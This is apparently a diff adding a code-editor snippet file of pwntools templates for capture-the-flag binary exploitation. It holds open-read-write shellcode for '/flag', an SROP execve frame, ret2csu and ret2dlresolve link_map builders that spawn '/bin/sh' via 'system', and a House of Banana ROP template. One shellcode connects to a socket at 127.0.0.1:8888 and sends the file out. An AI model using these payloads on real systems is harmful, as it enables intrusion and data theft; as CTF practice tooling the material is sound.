@@ -1,0 +1,504 @@
+{
+	"tmplate_header": {
+		"scope": "python",
+		"prefix": "pwn_header",
+		"body": [
+			"#! /usr/bin/env python3",
+			"from pwn import *",
+			"from ctools import *",
+			"",
+			"### CONFIG ========================================",
+			"",
+			"context(os=\"linux\", arch=\"amd64\")",
+			"",
+			"elf_path = '$1'",
+			"libc_path = '$2'",
+			"",
+			"config = {",
+			"	'host': '',",
+			"	'port': 0,",
+			"	'target': 'LOCAL',",
+			"	'args': [],",
+			"	'preload': [libc_path],",
+			"	'elf_path': elf_path,",
+			"	'libc_path': libc_path,",
+			"	'apath': '',",
+			"}",
+			"",
+			"TMUX_TERMINAL()",
+			"DEBUG = lambda s='', l=True, m=False: udebug(io, script=s, load=l, source=m)",
+			"",
+			"cct(**config)",
+			"cct.init()",
+			"",
+			"### CONFIG END ===================================",
+			"",
+			"io = conn()",
+			"# context.log_level = \"debug\"",
+			"",
+			"elf = ELF(elf_path)",
+			"# libc = ELF(libc_path, checksec=False)",
+			"",
+			"def exp():",
+			"	$3",
+			"	pass",
+			"",
+			"if __name__ == '__main__':",
+			"	exp()",
+			"	io.interactive()",
+		],
+		"description": "tmplate_header"
+	},
+	"pwntools_sendlineafter": {
+		"scope": "python",
+		"prefix": "sla",
+		"body": [
+			"io.sendlineafter(b'$1', $2)",
+			"$3"
+		],
+		"description": "sendlineafter"
+	},
+	"pwntools_sendline": {
+		"scope": "python",
+		"prefix": "sl",
+		"body": [
+			"io.sendline($1)",
+			"$2"
+		],
+		"description": "sendline"
+	},
+	"pwntools_send": {
+		"scope": "python",
+		"prefix": "sd",
+		"body": [
+			"io.send($1)",
+			"$2"
+		],
+		"description": "send"
+	},
+	"pwntools_sendafter": {
+		"scope": "python",
+		"prefix": "sa",
+		"body": [
+			"io.sendafter(b'$1', $2)",
+			"$3"
+		],
+		"description": "sendafter"
+	},
+	"pwntools_recv": {
+		"scope": "python",
+		"prefix": "rcv",
+		"body": [
+			"io.recv($1)$2"
+		],
+		"description": "recv"
+	},
+	"pwntools_recvuntil": {
+		"scope": "python",
+		"prefix": "rcu",
+		"body": [
+			"io.recvuntil(b'$1')",
+			"$2"
+		],
+		"description": "recvuntil"
+	},
+	"pwntools_got": {
+		"scope": "python",
+		"prefix": "gots",
+		"body": [
+			"elf.got['$1']$2"
+		],
+		"description": "elf.got[]"
+	},
+	"pwntools_plt": {
+		"scope": "python",
+		"prefix": "plts",
+		"body": [
+			"elf.plt['$1']$2"
+		],
+		"description": "elf.plt[]"
+	},
+	"pwntools_libcsym": {
+		"scope": "python",
+		"prefix": "lsym",
+		"body": [
+			"libc.symbols['$1']$2"
+		],
+		"description": "libc.symbols[]"
+	},
+	"pwntools_pwnsym": {
+		"scope": "python",
+		"prefix": "psym",
+		"body": [
+			"elf.symbols['$1']$2"
+		],
+		"description": "elf.symbols[]"
+	},
+	"pwntools_libc_search": {
+		"scope": "python",
+		"prefix": "lsearch",
+		"body": [
+			"libc.search($1).__next__()$2",
+		],
+		"description": "libc.search"
+	},
+	"pwntools_srop": {
+		"scope": "python",
+		"prefix": "srop",
+		"body":[
+			"frame = SigreturnFrame() # syscall execve",
+			"frame.rax = 0x3b # syscall code",
+			"frame.rdi = bss_start",
+			"frame.rsi = 0",
+			"frame.rdx = 0",
+			"frame.rip = syscall_ret",
+			""
+		],
+		"description": "SROP"
+	},
+	"pwntools_success": {
+		"scope": "python",
+		"prefix": "scs",
+		"body":[
+			"success(f'{$1 = :#x}')",
+			"$2"
+		],
+		"description": "success"
+	},
+	"pwntools_orw": {
+		"scope": "python",
+		"prefix": "orw",
+		"body":[
+			"shellcode = f\"\"\"",
+			"	mov rax, 0x67616c662f",
+			"	push rax",
+			"",
+			"	mov rax, __NR_open",
+			"	mov rdi, rsp",
+			"	xor rsi, rsi",
+			"	xor rdx, rdx",
+			"	syscall",
+			"",
+			"	mov rax, __NR_read",
+			"	mov rdi, 3",
+			"	mov rsi, rsp",
+			"	mov rdx, 0x50",
+			"	syscall",
+			"",
+			"	mov rax, __NR_write",
+			"	mov rdi, 1",
+			"	mov rsi, rsp",
+			"	mov rdx, 0x50",
+			"	syscall",
+			"\"\"\"",
+		],
+		"description": "orw"
+	},
+	"pwntools_orw_iovec": {
+		"scope": "python",
+		"prefix": "orw_iov",
+		"body":[
+			"shellcode = \"\"\"",
+			"	push 0x50",
+			"	lea rax, [rsp - 0x60]",
+			"	push rax",
+			"",
+			"	mov rax, 0x67616c662f",
+			"	push rax",
+			"",
+			"	push __NR_openat ; pop rax",
+			"	xor rdi, rdi",
+			"	push rsp ; pop rsi",
+			"	xor rdx, rdx",
+			"	xor r10, r10",
+			"	syscall",
+			"	push rax",
+			"",
+			"	push __NR_readv ; pop rax",
+			"	pop rdi",
+			"	popf",
+			"	push rsp ; pop rsi",
+			"	push 1 ; pop rdx",
+			"	syscall",
+			"",
+			"	push __NR_writev ; pop rax",
+			"	push 1 ; pop rdi",
+			"	syscall",
+			"\"\"\""
+		],
+		"description": "orw_iov"
+	},
+	"pwntools_orw_openat2": {
+		"scope": "python",
+		"prefix": "orw_openat2",
+		"body":[
+			"shellcode = f\"\"\"",
+			"	push 0x50",
+			"	lea rax, [rsp - 0x90]",
+			"	push rax",
+			"",
+			"	mov rax, 0x67616c662f",
+			"	push rax",
+			"",
+			"	push __NR_openat2 ; pop rax",
+			"	xor rdi, rdi",
+			"	push rsp ; pop rsi",
+			"	push rdi ; push rdi ; push rdi",
+			"	mov rdx, rsp",
+			"	push 0x18 ; pop r10",
+			"	syscall",
+			"	popf ; popf ; popf",
+			"	push rax",
+			"",
+			"	push __NR_readv ; pop rax",
+			"	pop rdi",
+			"	popf",
+			"	push rsp ; pop rsi",
+			"	push 1 ; pop rdx",
+			"	syscall",
+			"",
+			"	push __NR_writev ; pop rax",
+			"	push 1 ; pop rdi",
+			"	syscall",
+			"\"\"\""
+		],
+		"description": "orw_openat2"
+	},
+	"pwntools_ret2rsu_r15": {
+		"scope": "python",
+		"prefix": "ret2csu_r15",
+		"body":[
+			"csu1 = $1",
+			"csu2 = $2",
+			"def csu_pad(edi: int, rsi: int, rdx: int, r15: int, rbp: int = 0):",
+			"	pad: bytes = p64(csu1) + p64(0) + p64(1) + p64(edi) + p64(rsi) + p64(rdx) + p64(r15)",
+			"	pad += p64(csu2)",
+			"	pad += p64(0) * 2 + p64(rbp) + p64(0) * 4",
+			"	return pad",
+			"$3"
+		],
+		"description": "ret2csu"
+	},
+	"pwntools_r64": {
+		"scope": "python",
+		"prefix": "r64",
+		"body":[
+			"io.recvuntil(b'0x')",
+			"$1 = int(io.recv(12), 16)$2",
+			"success(f'{$1 = :#x}')",
+			"$3"
+		],
+		"description": "r64"
+	},
+	"pwntools_l64": {
+		"scope": "python",
+		"prefix": "l64",
+		"body":[
+			"io.recvuntil(b'$1')",
+			"$2 = u64(io.recv(6).ljust(8, b'\\x00'))$3",
+			"success(f'{$2 = :#x}')",
+			"$4"
+		],
+		"description": "leak64"
+	},
+	"pwntools_l32": {
+		"scope": "python",
+		"prefix": "l32",
+		"body":[
+			"io.recvuntil(b'$1)",
+			"$2 = u32(io.recv(4))$3",
+			"success(f'{$2 = :#x}')",
+			"$4"
+		],
+		"description": "leak32"
+	},
+	"pwntools_repeat": {
+		"scope": "python",
+		"prefix": "repeat",
+		"body":[
+			"while(True):",
+			"	try:",
+			"		exp()",
+			"		break"
+			"	except EOFError:",
+			"		io.close()",
+			"		# pause()",
+			"		io = conn()",
+		],
+		"description": "repeat"
+	},
+	"pwntools_int2bytes": {
+		"scope": "python",
+		"prefix": "i2b",
+		"body":[
+			"str($1).encode()"
+		],
+		"description": "int2bytes"
+	},
+	"pwntools_reveal_ptr": {
+		"scope": "python",
+		"prefix": "reveal",
+		"body":[
+			"def reveal_ptr(ptr, addr):",
+    		"	return (addr >> 12) ^ ptr",
+			"",
+			"$1"
+		],
+		"description": "reveal_ptr"
+	},
+	"pwntools_heap_menu": {
+		"scope": "python",
+		"prefix": "heap_menu",
+		"body":[
+			"def add(idx, size):",
+			"	io.sendlineafter(b'$1', b'$2')",
+			"	io.sendlineafter(b'Index$6', str(idx).encode())",
+			"	io.sendlineafter(b'Size$7', str(size).encode())",
+			"",
+			"def show(idx):",
+			"	io.sendlineafter(b'$1', b'$3')",
+			"	io.sendlineafter(b'Index$6', str(idx).encode())",
+			"",
+			"def free(idx):",
+			"	io.sendlineafter(b'$1', b'$4')",
+			"	io.sendlineafter(b'Index$6', str(idx).encode())",
+			"",
+			"def edit(idx, pad):",
+			"	io.sendlineafter(b'$1', b'$5')",
+			"	io.sendlineafter(b'Index$6', str(idx).encode())",
+			"	io.sendafter(b'Content$8', pad)"
+		],
+		"description": "heap_menu"
+	},
+	"pwntools_socket": {
+		"scope": "python",
+		"prefix": "orw_socket",
+		"body":[
+			"socket_in = u64(sockaddr_in('127.0.0.1', 8888)[:8])",
+			"",
+			"shellcode = f\"\"\"",
+			"	mov rax, 0x67616c662f",
+			"	push rax",
+			"",
+			"	push __NR_open \\n pop rax ",
+			"	push rsp \\n pop rdi",
+			"	xor rsi, rsi",
+			"	xor rdx, rdx",
+			"	syscall",
+			"	push rax \\n pop r14",
+			"",
+			"	push __NR_socket \\n pop rax",
+			"	push 2 \\n pop rdi",
+			"	push 1 \\n pop rsi",
+			"	xor rdx, rdx",
+			"	syscall",
+			"	push rax \\n pop r15",
+			"",
+			"	push 0",
+			"	mov rax, {hex(socket_in)} \\n push rax",
+			"",
+			"	push __NR_connect \\n pop rax",
+			"	push r15 \\n pop rdi",
+			"	push rsp \\n pop rsi",
+			"	push 0x10 \\n pop rdx",
+			"	syscall",
+			"",
+			"	push __NR_sendfile \\n pop rax",
+			"	push r15 \\n pop rdi",
+			"	push r14 \\n pop rsi",
+			"	xor rdx, rdx",
+			"	push 0x50 \\n pop r10",
+			"	syscall",
+			"\"\"\""
+		],
+		"description": "orw_socket"
+	},
+	"pwntools_ret2dl": {
+		"scope": "python",
+		"prefix": "ret2dl",
+		"body":[
+			"def link_map_gen(fake_link_map_addr: int, bss: int, known_func: str, target_func: str = 'system'):",
+			"	l_addr = libc.sym[target_func] - libc.sym[known_func]",
+			"	r_offset = bss + 0x200 - l_addr",
+			"	if l_addr < 0:  ",
+			"		l_addr = l_addr + 0x10000000000000000",
+			"	fake_link_map = p64(l_addr)                              # l_addr     0x0",
+			"	fake_link_map += p64(0) + p64(bss + 0x300)               # DT_STRTAB  0x8",
+			"	fake_link_map += p64(0) + p64(elf.got[known_func] - 0x8) # DT_SYMTAB  0x18",
+			"	fake_link_map += p64(0) + p64(fake_link_map_addr + 0x38) # DT_JMPREL  0x28",
+			"	fake_link_map += p64(r_offset) + p64(0x7) + p64(0)       # rel.plt    0x38",
+			"	fake_link_map = fake_link_map.ljust(0x68, b'\\x00')",
+			"	fake_link_map += p64(fake_link_map_addr + 0x8)           # *DT_STRTAB 0x68",
+			"	fake_link_map += p64(fake_link_map_addr + 0x18)          # *DT_SYMTAB 0x70",
+			"	fake_link_map += b'/bin/sh\\x00'                          # /bin/sh    0x78",
+			"	fake_link_map = fake_link_map.ljust(0xf8, b'\\x00')",
+			"	fake_link_map += p64(fake_link_map_addr + 0x28)          # *DT_JMPREL 0xf8",
+			"	return fake_link_map"
+		],
+		"description": "ret2dl"
+	},
+	"pwntools_print_new_section": {
+		"scope": "python",
+		"prefix": "print_newsec",
+		"body":[
+			"print(f\"\\n\\n#{' $1 '.center(70, '=')}#\")",
+			"$2"
+		],
+		"description": "print_new_section"
+	},
+	"pwntools_new_section": {
+		"scope": "python",
+		"prefix": "newsec",
+		"body":[
+			"",
+			"#-------------------------- $1 --------------------------#",
+			"$2"
+		],
+		"description": "new_section"
+	},
+	"pwntools_banana": {
+		"scope": "python",
+		"prefix": "banana",
+		"body":[
+			"fake_linkmap_addr = $1",
+			"",
+			"l = link_map(fake_linkmap_addr)",
+			"rop = flat([",
+			"	libc.search(asm('mov rsp, rdx\\nret')).__next__(),",
+			"	libc.search(asm('pop rdi\\nret')).__next__() + 1,",
+			"	# Start your ROP chain here",
+			"	$2",
+			"])",
+			"",
+			"nlink_map = 4",
+			"l_next_offset = 0x200",
+			"next_link_maps = b''",
+			"",
+			"for i in range(nlink_map - 1):",
+			"	next_link_maps += flat({",
+			"		0x18: (l.address + l_next_offset + 0x30 * (i + 1)) if i != (nlink_map - 2) else 0,",
+			"		0x28: l.address + l_next_offset + 0x30 * i",
+			"	}, filler=b'\\x00')",
+			"",
+			"fake_linkmap = flat({",
+			"	0x0: 0, # l_addr",
+			"	0x18: l.address + l_next_offset, # l_next",
+			"	0x28: l.address, # l_real",
+			"	#-------------------------- Elf64_Dyn --------------------------#",
+			"	0x40: l.DT_FINI_ARRAY,",
+			"	0x48: l.address + 0x60,",
+			"	0x50: l.DT_FINI_ARRAYSZ,",
+			"	0x58: 2 * 0x8,",
+			"	0x60: rop,",
+			"	#-------------------------- l_info --------------------------#",
+			"	0x40 + l.DT_FINI_ARRAY * 8: l.address + 0x40,",
+			"	0x40 + l.DT_FINI_ARRAYSZ * 8: l.address + 0x50,",
+			"	#-------------------------- next_linkmaps --------------------------#",
+			"	l_next_offset: next_link_maps,",
+			"	0x31c: 0xff # l_init_called",
+			"}, filler=b'\\x00')",
+			"$3"
+		],
+		"description": "House of Banana"
+	},
+}
